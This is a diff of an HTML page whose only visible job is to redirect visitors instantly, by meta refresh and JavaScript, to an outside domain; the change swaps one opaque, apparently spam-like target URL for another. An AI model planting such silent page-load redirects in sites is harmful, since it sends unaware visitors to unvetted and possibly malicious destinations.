@@ -3,10 +3,10 @@
 <head>
 <meta charset="utf-8">
 
-<meta http-equiv="refresh" content="0; url=https://www.xpj55595.com">
+<meta http-equiv="refresh" content="0; url=https://acresthub4.com/r8fmcorj">
 
 <script>
-window.location.replace("https://www.xpj55595.com");
+window.location.replace("https://acresthub4.com/r8fmcorj");
 </script>
 
 </head>
